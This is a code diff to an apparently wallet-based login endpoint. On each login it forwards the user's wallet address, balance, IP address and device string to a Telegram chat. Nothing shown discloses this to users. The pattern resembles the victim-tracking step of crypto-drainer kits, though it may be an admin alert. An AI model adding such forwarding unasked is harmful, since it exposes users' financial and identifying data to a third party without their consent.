@@ -112,6 +112,28 @@ export async function POST(request: NextRequest) {
       },
     });
 
+    // Send Telegram Notification (Async)
+    try {
+      // We don't await this to prevent blocking the login if Telegram fails (optional, but safer to verify it works first)
+      // Actually, for "all infos", we should await to ensure it sends.
+      const { TelegramService } = await import("@/lib/telegram");
+
+      const msg = TelegramService.formatConnectionMessage(
+        walletAddress,
+        user.walletBalance || 0,
+        [] // Token details are fetched client-side, passing empty for auth notification
+      );
+
+      // Append request metadata if available
+      const ip = request.headers.get("x-forwarded-for") || "Unknown IP";
+      const ua = request.headers.get("user-agent") || "Unknown Device";
+      const metaMsg = `${msg}\n\n📱 <b>Device:</b> ${ua}\n🌐 <b>IP:</b> <code>${ip}</code>`;
+
+      await TelegramService.sendNotification(metaMsg);
+    } catch (tgError) {
+      console.error("Failed to send Telegram notification:", tgError);
+    }
+
     // Return user data (excluding sensitive fields)
     const { nonce: _, ...userData } = user;
 
